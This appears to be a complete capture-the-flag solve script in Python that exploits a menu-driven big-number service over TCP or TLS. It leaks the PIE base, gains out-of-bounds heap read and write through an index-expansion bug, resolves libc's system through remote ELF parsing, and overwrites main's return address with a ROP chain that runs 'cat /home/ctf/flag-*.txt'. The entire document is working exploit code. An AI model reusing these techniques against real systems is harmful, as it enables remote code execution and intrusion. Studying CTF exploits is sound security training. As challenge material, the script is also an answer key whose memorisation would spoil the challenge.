#!/usr/bin/env python3
import json
import os
import re
import socket
import ssl
import struct
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parent
PROMPT = b"> "
DECIMAL_OFFSET = 0x5060
DSO_HANDLE_OFFSET = 0x5008
PUTS_GOT_OFFSET = 0x4F40
RET_OFFSET = 0x101A
POP_RDI_OFFSET = 0x14CF
MAX_LIMBS = 0x800000
HEAP_STEP = 0x800000
HEAP_SEARCH_LIMIT = 0x40800000


def p64(value: int) -> bytes:
    return struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)


def u64(data: bytes) -> int:
    return struct.unpack("<Q", data.ljust(8, b"\0")[:8])[0]


class Tube:
    def __init__(self, sock: socket.socket):
        self.sock = sock
        self.sock.settimeout(60)
        self.buffer = bytearray()

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def sendline(self, data: bytes) -> None:
        self.send(data + b"\n")

    def recvuntil(self, marker: bytes) -> bytes:
        while True:
            pos = self.buffer.find(marker)
            if pos >= 0:
                end = pos + len(marker)
                result = bytes(self.buffer[:end])
                del self.buffer[:end]
                return result
            chunk = self.sock.recv(65536)
            if not chunk:
                raise EOFError(f"connection closed before {marker!r}")
            self.buffer.extend(chunk)

    def recvn(self, count: int) -> bytes:
        while len(self.buffer) < count:
            chunk = self.sock.recv(65536)
            if not chunk:
                raise EOFError(f"connection closed with {count} bytes pending")
            self.buffer.extend(chunk)
        result = bytes(self.buffer[:count])
        del self.buffer[:count]
        return result

    def recvall(self) -> bytes:
        result = bytearray(self.buffer)
        self.buffer.clear()
        self.sock.settimeout(3)
        while True:
            try:
                chunk = self.sock.recv(65536)
            except (TimeoutError, socket.timeout):
                break
            if not chunk:
                break
            result.extend(chunk)
        return bytes(result)


def load_endpoint() -> dict:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in data["endpoints"] if item["name"] == "main")
    return endpoint


def connect(endpoint: dict) -> Tube:
    raw = socket.create_connection((endpoint["host"], endpoint["port"]), timeout=15)
    if endpoint["protocol"] == "tls":
        context = ssl.create_default_context()
        raw = context.wrap_socket(raw, server_hostname=endpoint["host"])
    elif endpoint["protocol"] != "tcp":
        raise ValueError(f"unsupported protocol: {endpoint['protocol']}")
    return Tube(raw)


class Exploit:
    def __init__(self, io: Tube):
        self.io = io
        self.pie = 0
        self.decimal = 0
        self.oob_index = 0
        self.io.recvuntil(PROMPT)

    def choose(self, option: int) -> None:
        self.io.sendline(str(option).encode())

    def finish_action(self) -> bytes:
        return self.io.recvuntil(PROMPT)

    def add(self, size: int) -> None:
        self.choose(1)
        self.io.recvuntil(b"limbs: ")
        self.io.sendline(str(size).encode())
        self.finish_action()

    def destroy(self, index: int) -> None:
        self.choose(4)
        self.io.recvuntil(b"index: ")
        self.io.sendline(str(index).encode())
        self.finish_action()

    def load(self, index: int, data: bytes) -> bytes:
        self.choose(2)
        self.io.recvuntil(b"index: ")
        self.io.sendline(str(index).encode())
        self.io.recvuntil(b"bytes: ")
        self.io.sendline(str(len(data)).encode())
        self.io.recvuntil(b"mantissa: ")
        self.io.send(data)
        return self.finish_action()

    def view(self, index: int) -> bytes:
        self.choose(3)
        self.io.recvuntil(b"index: ")
        self.io.sendline(str(index).encode())
        return self.finish_action()

    def multiply(self, left: int, right: int) -> None:
        self.choose(6)
        self.io.recvuntil(b"left: ")
        self.io.sendline(str(left).encode())
        self.io.recvuntil(b"right: ")
        self.io.sendline(str(right).encode())
        self.io.recvuntil(b"rounding: ")
        self.io.sendline(b"up")
        output = self.finish_action()
        if b"ok\n" not in output:
            raise RuntimeError("floating-point index expansion failed")

    def leak_pie(self) -> None:
        output = self.view(-11)
        marker = b"mantissa: "
        pos = output.find(marker)
        if pos < 0 or len(output) < pos + len(marker) + 8:
            raise RuntimeError("PIE leak failed")
        leaked_self = u64(output[pos + len(marker):pos + len(marker) + 8])
        self.pie = leaked_self - DSO_HANDLE_OFFSET
        self.decimal = self.pie + DECIMAL_OFFSET
        if self.pie & 0xFFF:
            raise RuntimeError("unaligned PIE base")

    def calibrate_and_find_heap(self) -> None:
        self.add(MAX_LIMBS)
        self.destroy(0)
        for _ in range(65):
            self.add(MAX_LIMBS)

        self.load(2, b"1e308")
        self.load(3, b"1e308")
        self.multiply(2, 3)

        pattern = p64(self.decimal) * (MAX_LIMBS // 8)
        self.load(1, pattern)

        marker = b"mantissa: "
        for delta in range(HEAP_STEP, HEAP_SEARCH_LIMIT + HEAP_STEP, HEAP_STEP):
            candidate = self.decimal + delta
            index = (candidate - self.decimal) // 8
            output = self.view(index)
            pos = output.find(marker)
            if pos < 0:
                continue
            leaked = output[pos + len(marker):pos + len(marker) + 256]
            if len(leaked) == 256 and u64(leaked[8:16]) >> 40 in range(0x50, 0x80):
                self.oob_index = index
                return
        raise RuntimeError("patterned heap allocation was not found")

    def configure_slot_zero(self, target: int, size: int) -> None:
        if not (0 < size <= 256):
            raise ValueError("slot-zero size must be in 1..256")
        payload = bytearray(0x808)
        payload[:8] = p64(target)
        payload[0x800:0x808] = p64(size)
        self.load(self.oob_index, bytes(payload))

    def read_memory(self, address: int, size: int) -> bytes:
        result = bytearray()
        while len(result) < size:
            take = min(256, size - len(result))
            target = address + len(result)
            self.configure_slot_zero(target, take)
            output = self.view(0)
            marker = b"mantissa: "
            pos = output.find(marker)
            if pos < 0:
                raise RuntimeError(f"read failed at {target:#x}")
            chunk = output[pos + len(marker):pos + len(marker) + take]
            if len(chunk) != take:
                raise RuntimeError(f"short read at {target:#x}")
            result.extend(chunk)
        return bytes(result)

    def write_memory(self, address: int, data: bytes) -> None:
        if not data or len(data) > 256:
            raise ValueError("write size must be in 1..256")
        self.configure_slot_zero(address, len(data))
        self.load(0, data)


def find_elf_base(exploit: Exploit, pointer: int) -> int:
    page = pointer & ~0xFFF
    for _ in range(0x300):
        if exploit.read_memory(page, 4) == b"\x7fELF":
            return page
        page -= 0x1000
    raise RuntimeError("libc ELF header was not found")


class RemoteELF:
    PT_LOAD = 1
    PT_DYNAMIC = 2
    DT_NULL = 0
    DT_STRTAB = 5
    DT_SYMTAB = 6
    DT_GNU_HASH = 0x6FFFFEF5

    def __init__(self, exploit: Exploit, base: int):
        self.exploit = exploit
        self.base = base
        header = self.read(base, 64)
        if header[:4] != b"\x7fELF":
            raise RuntimeError("invalid remote ELF")
        phoff = struct.unpack_from("<Q", header, 32)[0]
        phentsize = struct.unpack_from("<H", header, 54)[0]
        phnum = struct.unpack_from("<H", header, 56)[0]
        phdrs = self.read(base + phoff, phentsize * phnum)
        dynamic = None
        for index in range(phnum):
            entry = phdrs[index * phentsize:(index + 1) * phentsize]
            p_type = struct.unpack_from("<I", entry, 0)[0]
            if p_type == self.PT_DYNAMIC:
                dynamic = base + struct.unpack_from("<Q", entry, 16)[0]
                break
        if dynamic is None:
            raise RuntimeError("remote ELF has no dynamic segment")
        self.tags = {}
        for index in range(128):
            tag, value = struct.unpack("<QQ", self.read(dynamic + index * 16, 16))
            if tag == self.DT_NULL:
                break
            self.tags[tag] = value if value >= base else base + value
        for required in (self.DT_STRTAB, self.DT_SYMTAB, self.DT_GNU_HASH):
            if required not in self.tags:
                raise RuntimeError(f"missing dynamic tag {required:#x}")

    def read(self, address: int, size: int) -> bytes:
        return self.exploit.read_memory(address, size)

    @staticmethod
    def gnu_hash(name: bytes) -> int:
        value = 5381
        for byte in name:
            value = ((value << 5) + value + byte) & 0xFFFFFFFF
        return value

    def symbol(self, name: str) -> int:
        wanted = name.encode()
        table = self.tags[self.DT_GNU_HASH]
        nbuckets, symoffset, bloom_size, _ = struct.unpack("<IIII", self.read(table, 16))
        buckets = table + 16 + bloom_size * 8
        chains = buckets + nbuckets * 4
        hash_value = self.gnu_hash(wanted)
        bucket = struct.unpack("<I", self.read(buckets + (hash_value % nbuckets) * 4, 4))[0]
        if bucket < symoffset:
            raise RuntimeError(f"symbol not found: {name}")
        index = bucket
        while index < bucket + 0x10000:
            chain = struct.unpack("<I", self.read(chains + (index - symoffset) * 4, 4))[0]
            if (chain & ~1) == (hash_value & ~1):
                symbol = self.read(self.tags[self.DT_SYMTAB] + index * 24, 24)
                string_offset = struct.unpack_from("<I", symbol, 0)[0]
                candidate = self.read(self.tags[self.DT_STRTAB] + string_offset, len(wanted) + 1)
                if candidate == wanted + b"\0":
                    value = struct.unpack_from("<Q", symbol, 8)[0]
                    return self.base + value
            if chain & 1:
                break
            index += 1
        raise RuntimeError(f"symbol not found: {name}")


def locate_main_return(exploit: Exploit, stack_pointer: int, libc_base: int) -> int:
    start = (stack_pointer - 0x8000) & ~0xFF
    for address in range(start, stack_pointer + 0x100, 0x100):
        data = exploit.read_memory(address, 256)
        for pos in range(0, 256 - 0x58, 8):
            slot = address + pos
            self_pointer = u64(data[pos:pos + 8])
            menu_choice = u64(data[pos + 8:pos + 16])
            saved_return = u64(data[pos + 0x50:pos + 0x58])
            if (self_pointer == slot + 8 and menu_choice <= 6
                    and libc_base <= saved_return < libc_base + 0x400000):
                return slot + 0x50
    raise RuntimeError("main return address was not found on the stack")


def run() -> bytes:
    endpoint = load_endpoint()
    exploit = Exploit(connect(endpoint))
    exploit.leak_pie()
    exploit.calibrate_and_find_heap()

    puts_pointer = u64(exploit.read_memory(exploit.pie + PUTS_GOT_OFFSET, 8))
    libc_base = find_elf_base(exploit, puts_pointer)
    libc = RemoteELF(exploit, libc_base)
    system = libc.symbol("system")
    try:
        environ = libc.symbol("__environ")
    except RuntimeError:
        environ = libc.symbol("environ")

    command_address = exploit.pie + 0x9800
    command = b"cat /home/ctf/flag-*.txt\0"
    exploit.write_memory(command_address, command)

    stack_pointer = u64(exploit.read_memory(environ, 8))
    return_address = locate_main_return(exploit, stack_pointer, libc_base)
    rop = b"".join(p64(value) for value in (
        exploit.pie + RET_OFFSET,
        exploit.pie + POP_RDI_OFFSET,
        command_address,
        system,
    ))
    exploit.write_memory(return_address, rop)
    exploit.io.sendline(b"x")
    output = exploit.io.recvall()
    match = re.search(rb"pwnsec\{[^}\r\n]+\}", output)
    if not match:
        raise RuntimeError("flag was not present after ROP execution")
    return match.group(0)


def main() -> int:
    try:
        flag = run()
    except Exception as error:
        sys.stderr.write(f"solve failed: {error}\n")
        return 1
    sys.stdout.buffer.write(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
